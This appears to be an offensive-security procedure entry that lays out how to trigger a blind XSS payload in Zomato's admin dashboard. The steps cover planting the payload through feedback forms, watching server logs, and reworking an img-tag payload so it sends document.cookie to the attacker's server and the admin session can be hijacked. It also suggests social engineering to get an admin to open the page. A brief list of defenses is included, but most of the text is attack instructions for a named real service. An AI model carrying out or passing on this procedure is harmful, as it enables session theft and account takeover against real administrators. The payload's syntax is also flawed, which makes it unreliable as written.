---
id: proc-zomato-xss-trigger
tags:
  - xss-trigger
  - admin-exploitation
  - exfiltration
type: procedure
tools: []
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:55:38.119Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Trigger-XSS-on-Admin-Dashboard-View

## Summary

This procedure relies on an admin viewing the injected data in the Zomato dashboard, causing the blind XSS payload to execute and send a request to the attacker's logging server, confirming exploitation and enabling potential malicious actions like cookie theft.

## Description

Once the payload is injected, it remains dormant until an admin accesses the affected dashboard section. The img tag in the payload loads an external resource, executing in the admin's browser context and beaconing to the attacker's server. This can be extended to steal cookies by modifying the payload to include document.cookie in the request. The attack is blind, so success is verified via server logs showing the admin's details.

## Requirements

1. Injected XSS payload from prior steps
2. Admin access to the vulnerable dashboard section
3. Active logging server monitoring requests
4. Patience or social engineering to induce admin view

## Defense

Defensive measures and detection strategies:

- Role-based access controls (RBAC) to limit admin views
- Sanitize all displayed data in admin panels
- Implement client-side XSS auditors or CSP headers
- Alert on unexpected outbound connections from admin browsers

## Objectives

1. Execute JavaScript in admin's high-privilege context
2. Exfiltrate session data or confirm access
3. Chain to further attacks like account takeover

## Instructions

### Step 1: Induce Admin View

**Context**: Ensure the injected data is visible to admins.

Submit the payload via the app function that populates the admin dashboard (e.g., user report or feedback section). Wait for admin review process.

> Expected output: Payload stored; no immediate feedback.

### Step 2: Monitor for Trigger

**Context**: Watch server logs for execution.

Use tail -f log.txt on the server to observe incoming requests.

> Expected output: Log entry with admin IP and Zomato referrer upon dashboard load.

### Step 3: Verify and Extend

**Context**: Confirm XSS and prepare for theft.

If logged, the XSS is live. Modify payload for cookie exfil: `<img src="http://<my_server_ip>/zomato.php?c="+document.cookie+"">` and reinject if needed.

> Expected output: Logs include cookie values for admin session hijack.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Collection]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- execution
- collection
- dashboard-exploit
